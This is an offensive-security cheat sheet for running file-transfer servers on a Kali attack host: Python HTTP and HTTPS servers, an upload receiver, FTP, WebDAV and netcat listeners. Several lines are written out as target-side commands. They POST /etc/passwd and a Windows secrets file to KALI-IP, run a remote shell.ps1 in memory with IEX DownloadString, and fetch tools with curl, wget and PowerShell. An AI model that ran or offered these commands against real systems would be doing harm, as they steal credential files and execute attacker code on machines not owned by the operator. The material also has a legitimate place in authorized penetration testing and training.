# Python HTTP Server

**Tags:** `#python` `#httpserver` `#filetransfer` `#server` `#linux` `#upload` `#exfil`

Quick HTTP server for serving files from Kali to targets. Python's `http.server` module is the fastest way to spin up a download server — one command, serves the current directory, no config needed. Extended with `pyftpdlib` for FTP and custom scripts for upload/exfil receiving.

**Source:** Built into Python 3 — pre-installed on Kali

```bash
# Serve current directory on port 80
python3 -m http.server 80

# Target downloads with:
# curl http://KALI-IP/tool.exe -o /tmp/tool.exe
# wget http://KALI-IP/tool.exe -O /tmp/tool.exe
```

---

## HTTP Server

```bash
# Port 80 (requires sudo) — easier for targets
sudo python3 -m http.server 80

# Port 8080 (no sudo needed)
python3 -m http.server 8080

# Serve specific directory
python3 -m http.server 80 --directory /opt/tools

# Bind to specific interface only (OPSEC)
python3 -m http.server 8080 --bind 192.168.45.200

# Python 2 (legacy)
python2 -m SimpleHTTPServer 8080
```

---

## Upload Receiver — Accept Files from Targets

Python's `http.server` is download-only. For receiving files (exfil), use a custom receiver:

```bash
# Simple POST receiver — saves files to current directory
python3 -c "
import http.server, os

class UploadHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        filename = self.headers.get('X-Filename', 'upload.bin')
        data = self.rfile.read(length)
        with open(filename, 'wb') as f:
            f.write(data)
        print(f'[+] Received: {filename} ({len(data)} bytes)')
        self.send_response(200)
        self.end_headers()
    def log_message(self, *args): pass

http.server.HTTPServer(('', 8000), UploadHandler).serve_forever()
"

# Target sends file:
# curl -X POST http://KALI-IP:8000 -H "X-Filename: passwd" --data-binary @/etc/passwd
# Invoke-WebRequest -Uri http://KALI-IP:8000 -Method POST -InFile C:\secret.txt -Headers @{"X-Filename"="secret.txt"}
```

---

## FTP Server (pyftpdlib)

FTP is useful for Windows targets — `ftp.exe` is built into all Windows versions.

```bash
# Install
pip install pyftpdlib

# Anonymous FTP — read/write
python3 -m pyftpdlib -p 21 -w

# Authenticated FTP
python3 -m pyftpdlib -p 21 -u user -P Password -w

# Serve specific directory
python3 -m pyftpdlib -p 21 -w -d /opt/tools
```

```cmd
:: Windows — connect and download via built-in ftp.exe
ftp KALI-IP
> user anonymous
> binary
> get tool.exe
> bye

:: Or one-liner via script
echo open KALI-IP > ftp.txt && echo anonymous >> ftp.txt && echo "" >> ftp.txt && echo binary >> ftp.txt && echo get tool.exe >> ftp.txt && echo bye >> ftp.txt
ftp -s:ftp.txt

:: PowerShell FTP download
(New-Object Net.WebClient).DownloadFile('ftp://KALI-IP/tool.exe', 'C:\Temp\tool.exe')
```

---

## HTTPS Server (Self-Signed)

Useful when target environment blocks HTTP but allows HTTPS.

```bash
# Generate self-signed cert
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=localhost'

# HTTPS server
python3 -c "
import http.server, ssl
server = http.server.HTTPServer(('', 443), http.server.SimpleHTTPRequestHandler)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain('cert.pem', 'key.pem')
server.socket = ctx.wrap_socket(server.socket, server_side=True)
server.serve_forever()
"

# Target downloads (skip cert check):
# curl -k https://KALI-IP/tool.exe -o /tmp/tool.exe
# iwr https://KALI-IP/tool.exe -OutFile C:\Temp\tool.exe -SkipCertificateCheck
```

---

## WebDAV Server

Allows Windows targets to interact via `net use` or Explorer — useful for in-memory script loading.

```bash
# Install wsgidav
pip install wsgidav cheroot

# Start WebDAV server
wsgidav --host=0.0.0.0 --port=80 --root=/opt/tools --auth=anonymous
```

```powershell
# Windows — mount WebDAV as drive
net use Z: http://KALI-IP/
copy Z:\tool.exe C:\Temp\

# Load PS1 directly from WebDAV into memory
IEX (New-Object Net.WebClient).DownloadString('http://KALI-IP/shell.ps1')
```

---

## Netcat Exfil Receiver

For raw TCP exfil when HTTP isn't feasible:

```bash
# Receive single file
nc -lvnp 9001 > received.txt

# Receive with automatic filename from header (custom)
nc -lvnp 9001 | tee received.bin | xxd | head   # preview while receiving

# Keep listening for multiple files (ncat)
ncat -lvnp 9001 -k > received.bin
```

---

## Quick Reference — Server Cheatsheet

| Method | Command | Protocol | Notes |
|---|---|---|---|
| HTTP download | `python3 -m http.server 80` | HTTP | Download only |
| HTTP upload | Custom receiver script above | HTTP POST | Exfil |
| FTP | `python3 -m pyftpdlib -p 21 -w` | FTP | Windows `ftp.exe` compat |
| SMB | `impacket-smbserver share . -smb2support` | SMB | Windows-native |
| HTTPS | Custom ssl server above | HTTPS | Bypass HTTP blocks |
| WebDAV | `wsgidav --port=80 ...` | WebDAV | `net use` mounting |
| Raw TCP | `nc -lvnp 9001 > file` | TCP | Last resort |
| Updog | `updog -p 80` | HTTP | Upload + download GUI |

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
